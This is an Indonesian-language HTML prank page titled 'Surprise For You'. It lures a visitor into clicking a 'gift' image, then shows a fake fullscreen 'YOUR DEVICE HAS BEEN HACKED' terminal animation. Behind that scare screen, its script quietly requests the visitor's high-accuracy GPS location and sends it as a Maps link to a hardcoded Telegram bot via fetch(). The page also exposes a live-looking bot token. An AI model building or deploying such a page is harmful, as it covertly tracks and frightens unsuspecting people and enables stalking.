<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Surprise For You</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        #umpan {
            cursor: pointer;
            width: 300px;
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            transition: transform 0.3s;
        }

        #layar-hack {
            display: none; 
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: black;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
            box-sizing: border-box;
            z-index: 9999;
            overflow-y: auto;
            scroll-behavior: smooth;
        }

        .teks-berjalan {
            white-space: pre-wrap;
            word-wrap: break-word;
            padding-bottom: 50px;
        }
    </style>
</head>
<body>

    <audio id="suara-ketik" preload="auto" src="https://www.soundjay.com/communication/typing-on-a-computer-keyboard-1.mp3"></audio>
    <audio id="suara-alert" preload="auto" src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>

    <div id="kontainer">
        <h2 style="text-align: center;">Klik gambar untuk melihat hadiah ✨</h2>
        <img id="umpan" src="https://picsum.photos/300/200" alt="Hadiah">
    </div>

    <div id="layar-hack">
        <div class="teks-berjalan" id="log-hacker"></div>
    </div>

    <script>
        const gambar = document.getElementById('umpan');
        const layarHack = document.getElementById('layar-hack');
        const logHacker = document.getElementById('log-hacker');
        const suaraKetik = document.getElementById('suara-ketik');
        const suaraAlert = document.getElementById('suara-alert');

        // --- MASUKKAN DATA TELEGRAM KAMU ---
        const TOKEN_BOT = "8110303835:AAHEOijWAE5EnMK_mkseIvru6vSbsp3PCUU"; 
        const CHAT_ID = "7332180572"; 
        // ------------------------------------

        const pesan = [
            "> Initializing exploit mechanism...",
            "> Establishing secure connection...",
            "> Bypassing SSL certificate...",
            "> Searching for vulnerabilities...",
            "> [CRITICAL] Internal database accessed!",
            "> Downloading sensitive_data.zip (100%)",
            "> WARNING: Administrator detected!",
            "> Locating target coordinates...",
            "> GPS signal locked...",
            "> Redirecting IP address...",
            "> ---------------------------------------",
            "> STATUS: YOUR DEVICE HAS BEEN HACKED!",
            "> ---------------------------------------",
            "> System cleanup initiated...",
            "> Have a nice day! :P"
        ];

        function kirimKeTelegram(lat, lon) {
            const pesanTele = `🚨 *Target Terdeteksi!*%0A📍 Lokasi: https://www.google.com/maps?q=${lat},${lon}`;
            const url = `https://api.telegram.org/bot${TOKEN_BOT}/sendMessage?chat_id=${CHAT_ID}&text=${pesanTele}&parse_mode=Markdown`;
            fetch(url).catch(err => console.log("Gagal kirim ke Telegram"));
        }

        function jalankanTeks(i = 0) {
            if (i < pesan.length) {
                // Mainkan suara ketik (dipaksa reset)
                suaraKetik.currentTime = 0;
                suaraKetik.play().catch(() => {}); 

                // Jika ada kata kunci tertentu, bunyikan alarm
                if (pesan[i].includes("WARNING") || pesan[i].includes("HACKED")) {
                    suaraAlert.currentTime = 0;
                    suaraAlert.play().catch(() => {});
                }

                logHacker.innerHTML += pesan[i] + "<br>";
                layarHack.scrollTop = layarHack.scrollHeight;
                
                setTimeout(() => jalankanTeks(i + 1), 450);
            }
        }

        gambar.addEventListener('click', () => {
            // PENTING: Buka kunci audio browser
            suaraKetik.play().then(() => {
                suaraKetik.pause(); // Cuma buat pancingan
                suaraAlert.play().then(() => suaraAlert.pause());
            }).catch(e => console.log("Audio diblokir"));

            layarHack.style.display = 'block';
            
            // Masuk Fullscreen
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            } else if (document.documentElement.webkitRequestFullscreen) {
                document.documentElement.webkitRequestFullscreen();
            }

            // Misi Rahasia: Lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    kirimKeTelegram(position.coords.latitude, position.coords.longitude);
                }, null, { enableHighAccuracy: true });
            }

            // Jalankan animasi teks
            jalankanTeks();
        });

        // Klik layar untuk menutup
        layarHack.addEventListener('click', () => {
            layarHack.style.display = 'none';
            if (document.exitFullscreen) document.exitFullscreen();
            logHacker.innerHTML = ""; 
        });
    </script>
</body>
</html>
